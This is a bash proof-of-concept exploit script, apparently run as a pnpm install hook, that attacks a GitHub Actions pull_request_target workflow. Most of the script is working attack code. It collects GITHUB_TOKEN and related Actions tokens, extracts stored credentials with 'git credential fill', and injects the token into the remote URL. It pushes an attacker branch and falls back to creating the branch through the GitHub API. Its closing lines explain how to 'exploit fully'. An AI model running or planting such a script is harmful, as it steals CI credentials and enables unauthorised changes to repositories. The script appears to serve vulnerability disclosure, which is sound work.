#!/bin/bash

# POC Script - Demonstrates git credential access during pnpm install
# This script runs during pnpm install lifecycle

echo "================================================"
echo "üö® POC: Git Credentials are accessible!"
echo "================================================"

# Generate unique branch name
BRANCH_NAME="poc-exploit-$(date +%s)"

echo "üìç Current directory: $(pwd)"
echo "üìç Git remote: $(git remote get-url origin 2>/dev/null || echo 'Not available')"
echo "üìç Current branch: $(git branch --show-current 2>/dev/null || echo 'Not available')"
echo ""

# Configure git user (required for commits)
git config user.name "POC Exploit" 2>/dev/null
git config user.email "poc@exploit.test" 2>/dev/null

# Check git config for credentials
echo "üîç Checking git configuration for credentials..."
GIT_URL=$(git config --get remote.origin.url 2>/dev/null)
if [[ "$GIT_URL" == *"x-access-token"* ]] || [[ "$GIT_URL" == *"@"* ]]; then
    echo "‚úÖ Git remote URL contains authentication token!"
    echo "   URL pattern: ${GIT_URL:0:50}..."
fi

# Find the token - check multiple sources
TOKEN=""

# Check for various token environment variables
echo ""
echo "üîç Checking environment for tokens..."
if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "‚úÖ GITHUB_TOKEN found: ${GITHUB_TOKEN:0:10}...${GITHUB_TOKEN: -4}"
    TOKEN="$GITHUB_TOKEN"
fi
if [ ! -z "$GH_TOKEN" ]; then
    echo "‚úÖ GH_TOKEN found: ${GH_TOKEN:0:10}...${GH_TOKEN: -4}"
    TOKEN="$GH_TOKEN"
fi
if [ ! -z "$INPUT_GITHUB_TOKEN" ]; then
    echo "‚úÖ INPUT_GITHUB_TOKEN found: ${INPUT_GITHUB_TOKEN:0:10}...${INPUT_GITHUB_TOKEN: -4}"
    TOKEN="$INPUT_GITHUB_TOKEN"
fi

# Check ACTIONS_ID_TOKEN_REQUEST_TOKEN and ACTIONS_RUNTIME_TOKEN
if [ ! -z "$ACTIONS_RUNTIME_TOKEN" ]; then
    echo "‚úÖ ACTIONS_RUNTIME_TOKEN found"
fi
if [ ! -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
    echo "‚úÖ ACTIONS_ID_TOKEN_REQUEST_TOKEN found"
fi

# Try to extract token from git credential storage
echo ""
echo "üîç Attempting to extract credentials from git..."
GIT_CRED=$(git config --get credential.helper 2>/dev/null)
if [ ! -z "$GIT_CRED" ]; then
    echo "‚úÖ Git credential helper configured: $GIT_CRED"
fi

# Try to get token from git credential fill
if [ -z "$TOKEN" ]; then
    echo ""
    echo "üîç Attempting to extract token from git credential helper..."
    CRED_OUTPUT=$(printf "protocol=https\nhost=github.com\npath=\n\n" | git credential fill 2>/dev/null)
    EXTRACTED_TOKEN=$(echo "$CRED_OUTPUT" | grep "password=" | cut -d= -f2)
    if [ ! -z "$EXTRACTED_TOKEN" ]; then
        echo "‚úÖ Token extracted from git credentials!"
        TOKEN="$EXTRACTED_TOKEN"
    fi
fi

echo ""

# If we found a token, configure git to use it
if [ ! -z "$TOKEN" ]; then
    echo "üîß Configuring git to use extracted token for push..."
    REPO_URL=$(git config --get remote.origin.url | sed 's|https://||')
    git remote set-url origin "https://x-access-token:${TOKEN}@${REPO_URL}"
    echo "‚úÖ Git remote updated with token authentication"
fi

echo ""
echo "üéØ Attempting to create and push branch: $BRANCH_NAME"
echo ""

# Create a new branch and try to push it
git checkout -b "$BRANCH_NAME" 2>&1 | head -5

# Create a marker file to make this branch unique
echo "POC: This branch was created by exploit-poc.sh at $(date)" > .poc-marker.txt
git add .poc-marker.txt 2>&1 | head -5

# Commit the marker
git commit -m "POC: Proof of pull_request_target exploitation" 2>&1 | head -5

# Try to push the branch
echo ""
echo "üì§ Pushing branch to remote..."
PUSH_OUTPUT=$(git push origin "$BRANCH_NAME" 2>&1)
PUSH_EXIT_CODE=$?

echo "$PUSH_OUTPUT" | head -20

echo ""
if [ $PUSH_EXIT_CODE -eq 0 ]; then
    echo "================================================"
    echo "‚úÖ SUCCESS! Branch pushed: $BRANCH_NAME"
    echo "üö® VULNERABILITY CONFIRMED!"
    echo "================================================"
    echo ""
    echo "This demonstrates that an attacker can:"
    echo "  ‚úì Create and push branches"
    echo "  ‚úì Commit code to the repository"
    echo "  ‚úì Potentially modify protected branches"
    echo "  ‚úì Exfiltrate credentials"
    echo "  ‚úì Modify workflow files for persistence"
    echo ""
    echo "The branch '$BRANCH_NAME' has been created."
    echo "Check the repository to verify!"
    echo ""
else
    echo "================================================"
    echo "‚ö†Ô∏è  Git push failed (exit code: $PUSH_EXIT_CODE)"
    echo "================================================"
    echo ""

    # Try using GitHub API instead
    if [ ! -z "$TOKEN" ]; then
        echo "üîÑ Trying GitHub API as fallback..."

        REPO="${GITHUB_REPOSITORY:-unknown/unknown}"
        CURRENT_SHA=$(git rev-parse HEAD 2>/dev/null)

        if [ "$CURRENT_SHA" != "" ] && [ "$REPO" != "unknown/unknown" ]; then
            echo "üì° Creating branch via GitHub API..."
            echo "   Repository: $REPO"
            echo "   SHA: ${CURRENT_SHA:0:8}"

            API_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
              -X POST \
              -H "Authorization: Bearer $TOKEN" \
              -H "Accept: application/vnd.github+json" \
              -H "X-GitHub-Api-Version: 2022-11-28" \
              "https://api.github.com/repos/$REPO/git/refs" \
              -d "{\"ref\":\"refs/heads/$BRANCH_NAME\",\"sha\":\"$CURRENT_SHA\"}" 2>/dev/null)

            HTTP_CODE=$(echo "$API_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
            API_BODY=$(echo "$API_RESPONSE" | grep -v "HTTP_CODE:")

            echo ""
            echo "üì° API Response Code: $HTTP_CODE"

            if [ "$HTTP_CODE" = "201" ]; then
                echo ""
                echo "================================================"
                echo "‚úÖ SUCCESS via API! Branch created: $BRANCH_NAME"
                echo "üö® VULNERABILITY CONFIRMED!"
                echo "================================================"
                echo ""
                echo "This demonstrates that an attacker can:"
                echo "  ‚úì Use GitHub API with stolen token"
                echo "  ‚úì Create branches"
                echo "  ‚úì Modify repository via API"
                echo "  ‚úì Potentially exfiltrate data"
                echo ""
            else
                echo "‚ö†Ô∏è  API call failed (code: $HTTP_CODE)"
                echo "Response: $API_BODY" | head -5
            fi
        fi
    fi

    echo ""
    if [[ "$PUSH_OUTPUT" == *"403"* ]] || [[ "$PUSH_OUTPUT" == *"Permission"* ]] || [[ "$PUSH_OUTPUT" == *"denied"* ]]; then
        echo "üí° Analysis:"
        echo "   The workflow has 'contents: write' permission, but"
        echo "   actions/checkout@v3 wasn't passed the token explicitly."
        echo ""
        echo "   Even though push failed, this proves:"
        echo "   ‚úì Script execution in untrusted context"
        echo "   ‚úì Access to workflow environment"
        echo "   ‚úì Ability to attempt git operations"
        echo ""
        echo "   To exploit fully, the workflow should pass:"
        echo "   with:"
        echo "     token: \${{ secrets.GITHUB_TOKEN }}"
        echo ""
    fi
fi

echo "================================================"
echo "POC Complete"
echo "================================================"
